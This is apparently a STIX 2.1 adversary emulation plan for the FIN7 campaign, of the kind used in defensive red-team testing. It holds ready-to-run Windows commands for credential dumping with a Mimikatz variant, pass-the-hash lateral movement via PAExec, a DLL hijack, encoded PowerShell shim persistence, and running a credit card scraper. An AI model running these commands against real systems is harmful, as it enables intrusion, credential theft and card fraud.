@@ -1,0 +1,584 @@
+{
+    "type": "bundle",
+    "id": "bundle--a1df0405-d799-459c-ad74-b4021f6366fa",
+    "objects": [
+        {
+            "type": "campaign",
+            "spec_version": "2.1",
+            "id": "campaign--c30763a7-172c-431e-a877-b18aecf9292a",
+            "created": "2024-02-03T15:13:21.755043Z",
+            "modified": "2024-02-03T15:13:21.755043Z",
+            "name": "FIN7",
+            "description": "FIN7 is a threat group attributed"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--eac2cf0f-7b51-44d2-83cb-57a34a29b7ff",
+            "created": "2024-02-03T15:13:21.755221Z",
+            "modified": "2024-02-03T15:13:21.755221Z",
+            "name": "Screenshot of end-users desktop",
+            "description": "Take screenshots of end user's endpoint.",
+            "extensions": {
+                "extension-definition--c13ebd37-184e-4670-acd3-467f09ebe2a2": {
+                    "attack_id": "T1113",
+                    "input_arguments": {
+                        "domain": {
+                            "default": "hospitality",
+                            "description": "The name of the target domain",
+                            "type": "string"
+                        },
+                        "domain.admin.username": {
+                            "default": "kmitnick",
+                            "description": "The username of the domain administrator",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "powershell.exe C:\\\\Users\\\\#{domain.admin.username}.#{domain}\\\\AppData\\\\Local\\\\takeScreenshot.ps1\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Screen Capture"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--256efaf3-dab0-46b6-a848-bccda722cbb1",
+            "created": "2024-02-03T15:13:21.756005Z",
+            "modified": "2024-02-03T15:13:21.756005Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--eac2cf0f-7b51-44d2-83cb-57a34a29b7ff",
+            "target_ref": "domain-name--62f03f71-5be0-5052-baed-45bea7b39973"
+        },
+        {
+            "type": "domain-name",
+            "spec_version": "2.1",
+            "id": "domain-name--62f03f71-5be0-5052-baed-45bea7b39973",
+            "value": "hospitality"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--d173c882-87cc-4436-bcd1-ce06066859f7",
+            "created": "2024-02-03T15:13:21.756656Z",
+            "modified": "2024-02-03T15:13:21.756656Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--eac2cf0f-7b51-44d2-83cb-57a34a29b7ff",
+            "target_ref": "user-account--ae5130fe-3c4d-5fe6-8a31-a779d76d4ed9"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--ae5130fe-3c4d-5fe6-8a31-a779d76d4ed9",
+            "account_login": "kmitnick"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--b184d537-612e-4605-b02d-522cefb7973b",
+            "created": "2024-02-03T15:13:21.756907Z",
+            "modified": "2024-02-03T15:13:21.756907Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--c30763a7-172c-431e-a877-b18aecf9292a",
+            "target_ref": "attack-pattern--eac2cf0f-7b51-44d2-83cb-57a34a29b7ff"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--82d2f5c7-7561-4d91-96d2-959473b9ad2b",
+            "created": "2024-02-03T15:13:21.757095Z",
+            "modified": "2024-02-03T15:13:21.757095Z",
+            "name": "Execution of stager.ps1",
+            "description": "Execution of previously placed stager.",
+            "extensions": {
+                "extension-definition--c13ebd37-184e-4670-acd3-467f09ebe2a2": {
+                    "attack_id": "T1059.003",
+                    "input_arguments": {
+                        "domain": {
+                            "default": "hospitality",
+                            "description": "The name of the target domain",
+                            "type": "string"
+                        },
+                        "domain.admin.username": {
+                            "default": "kmitnick",
+                            "description": "The username of the domain administrator",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "powershell.exe -ExecutionPolicy Bypass -NoExit -File C:\\\\Users\\\\#{domain.admin.username}.#{domain}\\\\AppData\\\\Local\\\\stager.ps1\"\n",
+                                "payloads": [
+                                    "stager.ps1"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Command and Scripting Interpreter - Windows Command Shell"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--05c3a682-aeea-468b-9e4f-55d6bc45a190",
+            "created": "2024-02-03T15:13:21.757486Z",
+            "modified": "2024-02-03T15:13:21.757486Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--82d2f5c7-7561-4d91-96d2-959473b9ad2b",
+            "target_ref": "domain-name--62f03f71-5be0-5052-baed-45bea7b39973"
+        },
+        {
+            "type": "domain-name",
+            "spec_version": "2.1",
+            "id": "domain-name--62f03f71-5be0-5052-baed-45bea7b39973",
+            "value": "hospitality"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--89847f78-0b5f-4072-bf54-7a1155ef0762",
+            "created": "2024-02-03T15:13:21.757948Z",
+            "modified": "2024-02-03T15:13:21.757948Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--82d2f5c7-7561-4d91-96d2-959473b9ad2b",
+            "target_ref": "user-account--ae5130fe-3c4d-5fe6-8a31-a779d76d4ed9"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--ae5130fe-3c4d-5fe6-8a31-a779d76d4ed9",
+            "account_login": "kmitnick"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--1c880954-e027-4ad7-873c-5237e649506e",
+            "created": "2024-02-03T15:13:21.758129Z",
+            "modified": "2024-02-03T15:13:21.758129Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--c30763a7-172c-431e-a877-b18aecf9292a",
+            "target_ref": "attack-pattern--82d2f5c7-7561-4d91-96d2-959473b9ad2b"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--ab937ef4-7c66-4349-ad3b-658c41fcf4c5",
+            "created": "2024-02-03T15:13:21.758364Z",
+            "modified": "2024-02-03T15:13:21.758364Z",
+            "name": "Enumerate",
+            "description": "Perform process discovery (T1057)",
+            "extensions": {
+                "extension-definition--c13ebd37-184e-4670-acd3-467f09ebe2a2": {
+                    "attack_id": "T1057",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "powershell.exe -c \"ps\"\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Process Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--8be5c359-cc97-40ee-ab99-70f8bd062f79",
+            "created": "2024-02-03T15:13:21.758758Z",
+            "modified": "2024-02-03T15:13:21.758758Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--c30763a7-172c-431e-a877-b18aecf9292a",
+            "target_ref": "attack-pattern--ab937ef4-7c66-4349-ad3b-658c41fcf4c5"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--b15d3014-a5d1-4ec6-934b-d7fe44451192",
+            "created": "2024-02-03T15:13:21.759134Z",
+            "modified": "2024-02-03T15:13:21.759134Z",
+            "name": "Execute SAMCats (Mimikatz)",
+            "description": "Dump SAM via Mimikatz(T1003.002)",
+            "extensions": {
+                "extension-definition--c13ebd37-184e-4670-acd3-467f09ebe2a2": {
+                    "attack_id": "T1003.002",
+                    "input_arguments": {
+                        "domain": {
+                            "default": "hospitality",
+                            "description": "The name of the target domain",
+                            "type": "string"
+                        },
+                        "domain.admin.username": {
+                            "default": "kmitnick",
+                            "description": "The username of the domain administrator",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "powershell.exe -ExecutionPolicy Bypass -NoExit -File \"C:\\\\Users\\\\#{domain.admin.username}.#{domain}\\\\AppData\\\\Local\\\\uac-samcats.ps1\"\n",
+                                "payloads": [
+                                    "uac-samcats.ps1",
+                                    "samcat.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "OS Credential Dumping: Security Account Manager"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--c05a82a0-b935-45d2-9ef7-b09880fd442f",
+            "created": "2024-02-03T15:13:21.759774Z",
+            "modified": "2024-02-03T15:13:21.759774Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--b15d3014-a5d1-4ec6-934b-d7fe44451192",
+            "target_ref": "domain-name--62f03f71-5be0-5052-baed-45bea7b39973"
+        },
+        {
+            "type": "domain-name",
+            "spec_version": "2.1",
+            "id": "domain-name--62f03f71-5be0-5052-baed-45bea7b39973",
+            "value": "hospitality"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--9f716673-f957-4649-83de-4add0fa48dad",
+            "created": "2024-02-03T15:13:21.760453Z",
+            "modified": "2024-02-03T15:13:21.760453Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--b15d3014-a5d1-4ec6-934b-d7fe44451192",
+            "target_ref": "user-account--ae5130fe-3c4d-5fe6-8a31-a779d76d4ed9"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--ae5130fe-3c4d-5fe6-8a31-a779d76d4ed9",
+            "account_login": "kmitnick"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--21a1b84e-d489-403e-82e4-e7ec3987d31a",
+            "created": "2024-02-03T15:13:21.760763Z",
+            "modified": "2024-02-03T15:13:21.760763Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--c30763a7-172c-431e-a877-b18aecf9292a",
+            "target_ref": "attack-pattern--b15d3014-a5d1-4ec6-934b-d7fe44451192"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--9a76889c-9518-4b3e-9c87-6618156015c6",
+            "created": "2024-02-03T15:13:21.761077Z",
+            "modified": "2024-02-03T15:13:21.761077Z",
+            "name": "Expand Access to itadmin",
+            "description": "Leverage PAExec to laterally move and execute on itadmin",
+            "extensions": {
+                "extension-definition--c13ebd37-184e-4670-acd3-467f09ebe2a2": {
+                    "attack_id": "T1570",
+                    "input_arguments": {
+                        "domain": {
+                            "default": "hospitality",
+                            "description": "The name of the target domain",
+                            "type": "string"
+                        },
+                        "domain.admin.username": {
+                            "default": "kmitnick",
+                            "description": "The username of the domain administrator",
+                            "type": "string"
+                        },
+                        "domain.admin.hash": {
+                            "default": "c3aa78cd0827b8e8603ac1c8996e6556",
+                            "description": "The password hash of the domain administrator",
+                            "type": "string"
+                        },
+                        "itadmin.ip.address": {
+                            "default": "10.0.1.6",
+                            "description": "The IP address of the itadmin workstation",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "cmd.exe /c \".\\paexec.exe \\\\#{itadmin.ip.address} -s -u #{domain}\\#{domain.admin.username} -p #{domain.admin.hash} -c -csrc \\\".\\hollow.exe\\\" hollow.exe\"\n",
+                                "payloads": [
+                                    "hollow.exe",
+                                    "paexec.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Lateral Tool Transfer"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--7205ea93-c890-43b0-8351-ef2f48439880",
+            "created": "2024-02-03T15:13:21.761668Z",
+            "modified": "2024-02-03T15:13:21.761668Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--9a76889c-9518-4b3e-9c87-6618156015c6",
+            "target_ref": "domain-name--62f03f71-5be0-5052-baed-45bea7b39973"
+        },
+        {
+            "type": "domain-name",
+            "spec_version": "2.1",
+            "id": "domain-name--62f03f71-5be0-5052-baed-45bea7b39973",
+            "value": "hospitality"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--7c3a7847-76a4-42a7-8c28-771dfa816344",
+            "created": "2024-02-03T15:13:21.76231Z",
+            "modified": "2024-02-03T15:13:21.76231Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--9a76889c-9518-4b3e-9c87-6618156015c6",
+            "target_ref": "user-account--ae5130fe-3c4d-5fe6-8a31-a779d76d4ed9"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--ae5130fe-3c4d-5fe6-8a31-a779d76d4ed9",
+            "account_login": "kmitnick"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--8b73a922-8a7b-4101-9011-d1cc331826d7",
+            "created": "2024-02-03T15:13:21.763379Z",
+            "modified": "2024-02-03T15:13:21.763379Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--9a76889c-9518-4b3e-9c87-6618156015c6",
+            "target_ref": "artifact--694dae1b-7411-50f5-94ca-fbb0d3db6ccb"
+        },
+        {
+            "type": "artifact",
+            "spec_version": "2.1",
+            "id": "artifact--694dae1b-7411-50f5-94ca-fbb0d3db6ccb",
+            "url": "",
+            "hashes": {
+                "MD5": "c3aa78cd0827b8e8603ac1c8996e6556"
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--14125cbf-5363-426d-863d-d895cbc7d2c4",
+            "created": "2024-02-03T15:13:21.763939Z",
+            "modified": "2024-02-03T15:13:21.763939Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--9a76889c-9518-4b3e-9c87-6618156015c6",
+            "target_ref": "ipv4-addr--c0d8d2b2-9997-521a-be54-bfaac946e919"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--c0d8d2b2-9997-521a-be54-bfaac946e919",
+            "value": "10.0.1.6"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--ea9ec223-3791-429f-86e2-2c95a8b489c2",
+            "created": "2024-02-03T15:13:21.764241Z",
+            "modified": "2024-02-03T15:13:21.764241Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--c30763a7-172c-431e-a877-b18aecf9292a",
+            "target_ref": "attack-pattern--9a76889c-9518-4b3e-9c87-6618156015c6"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--ab48e12f-def0-40a4-b3d9-ad958f45202a",
+            "created": "2024-02-03T15:13:21.764537Z",
+            "modified": "2024-02-03T15:13:21.764537Z",
+            "name": "Privilege Escalation",
+            "description": "Perform DLL hijack to escalate privileges.",
+            "extensions": {
+                "extension-definition--c13ebd37-184e-4670-acd3-467f09ebe2a2": {
+                    "attack_id": "T1574.001",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "robocopy BOOSTWRITE.dll C:\\\\Windows\\\\Syswow64\\\\srrstr.dll &&\ncmd.exe /c \"C:\\\\Windows\\\\Syswow64\\\\SystemPropertiesAdvanced.exe\"\n",
+                                "payloads": [
+                                    "BOOSTWRITE.dll"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Hijack Execution Flow - DLL Search Order Hijacking"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--890b6ebd-9a36-4ea2-a08c-1a980dc7bdaf",
+            "created": "2024-02-03T15:13:21.764838Z",
+            "modified": "2024-02-03T15:13:21.764838Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--c30763a7-172c-431e-a877-b18aecf9292a",
+            "target_ref": "attack-pattern--ab48e12f-def0-40a4-b3d9-ad958f45202a"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--eb99abcb-93e2-4a3e-bf05-a484839dc851",
+            "created": "2024-02-03T15:13:21.765147Z",
+            "modified": "2024-02-03T15:13:21.765147Z",
+            "name": "Setup Application Shim Persistence",
+            "description": "Execute PowerShell oneliner to install application shim.",
+            "extensions": {
+                "extension-definition--c13ebd37-184e-4670-acd3-467f09ebe2a2": {
+                    "attack_id": "T1027",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "powershell.exe -noprofile -encodedCommand \"JABkAGwAbAAgAD0AIABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAiAFwAXAB0AHMAYwBsAGkAZQBuAHQAXABYAFwAYgBpAG4AMwAyADkALgB0AG0AcAAiACAALQBFAG4AYwBvAGQAaQBuAGcAIABCAHkAdABlADsAIABOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAEQAUgBNAFwAIgAgAC0ATgBhAG0AZQAgACIANAAiACAAIAAtAFAAcgBvAHAAZQByAHQAeQBUAHkAcABlACAAQgBpAG4AYQByAHkAIAAtAFYAYQBsAHUAZQAgACQAZABsAGwAIAAtAEYAbwByAGMAZQA7ACAAIABDAG8AcAB5AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAXABcAHQAcwBjAGwAaQBlAG4AdABcAFgAXABkAGwAbAAzADIAOQAuAGQAbABsACIAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAIgAgAC0ARgBvAHIAYwBlADsAIABDAG8AcAB5AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAXABcAHQAcwBjAGwAaQBlAG4AdABcAFgAXABzAGQAYgBFADMANwA2AC4AdABtAHAAIgAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcAAiACAALQBGAG8AcgBjAGUAOwAgACAAJgAgAHMAZABiAGkAbgBzAHQALgBlAHgAZQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABzAGQAYgBFADMANwA2AC4AdABtAHAAIgA7AA==\"\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Obfuscated Files or Information"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--755ee47b-b413-433a-ab82-cbb3f8200424",
+            "created": "2024-02-03T15:13:21.765413Z",
+            "modified": "2024-02-03T15:13:21.765413Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--c30763a7-172c-431e-a877-b18aecf9292a",
+            "target_ref": "attack-pattern--eb99abcb-93e2-4a3e-bf05-a484839dc851"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--6ec6561b-e535-4fe3-9c20-a52e5982b513",
+            "created": "2024-02-03T15:13:21.765704Z",
+            "modified": "2024-02-03T15:13:21.765704Z",
+            "name": "Execute Application Shim Persistence",
+            "description": "Reboot the host to start shim persistence.",
+            "extensions": {
+                "extension-definition--c13ebd37-184e-4670-acd3-467f09ebe2a2": {
+                    "attack_id": "T1546.011",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "powershell.exe -c \"restart-computer -force\"\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Application Shimming"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--7a9b2f9e-12b8-43a8-8c6a-f6f8cd721bd7",
+            "created": "2024-02-03T15:13:21.765972Z",
+            "modified": "2024-02-03T15:13:21.765972Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--c30763a7-172c-431e-a877-b18aecf9292a",
+            "target_ref": "attack-pattern--6ec6561b-e535-4fe3-9c20-a52e5982b513"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--d04a02e1-a05c-46f8-adf0-c036266fe0a1",
+            "created": "2024-02-03T15:13:21.766256Z",
+            "modified": "2024-02-03T15:13:21.766256Z",
+            "name": "Execute PillowMint Credit Card Scraper",
+            "description": "Upload and execute the PillowMint credit card scraper as debug.exe",
+            "extensions": {
+                "extension-definition--c13ebd37-184e-4670-acd3-467f09ebe2a2": {
+                    "attack_id": "T1057",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "cleanup": "Remove-Item -Force debug.exe;\n",
+                                "command": "Move-Item pillowMint.exe debug.exe;\n.\\debug.exe;\n",
+                                "payloads": [
+                                    "pillowMint.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Process Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--c1dbf952-204c-4588-9235-5ed7e3e36c17",
+            "created": "2024-02-03T15:13:21.766531Z",
+            "modified": "2024-02-03T15:13:21.766531Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--c30763a7-172c-431e-a877-b18aecf9292a",
+            "target_ref": "attack-pattern--d04a02e1-a05c-46f8-adf0-c036266fe0a1"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--89b84389-036e-4c3d-a490-bf8ba50bffe8",
+            "created": "2024-02-03T15:13:21.766829Z",
+            "modified": "2024-02-03T15:13:21.766829Z",
+            "name": "Archive Credit Card Data",
+            "description": "Compress credit card data into an archive using 7za.exe",
+            "extensions": {
+                "extension-definition--c13ebd37-184e-4670-acd3-467f09ebe2a2": {
+                    "attack_id": "T1560.001",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "cleanup": "Remove-Item -Force log.7z;\n",
+                                "command": ".\\7za.exe a log log.txt;\n",
+                                "payloads": [
+                                    "7za.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Archive Collected Data: Archive via Utility"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--3db55be4-f644-48c1-889f-2e2eef2fa747",
+            "created": "2024-02-03T15:13:21.767106Z",
+            "modified": "2024-02-03T15:13:21.767106Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--c30763a7-172c-431e-a877-b18aecf9292a",
+            "target_ref": "attack-pattern--89b84389-036e-4c3d-a490-bf8ba50bffe8"
+        }
+    ]
+}
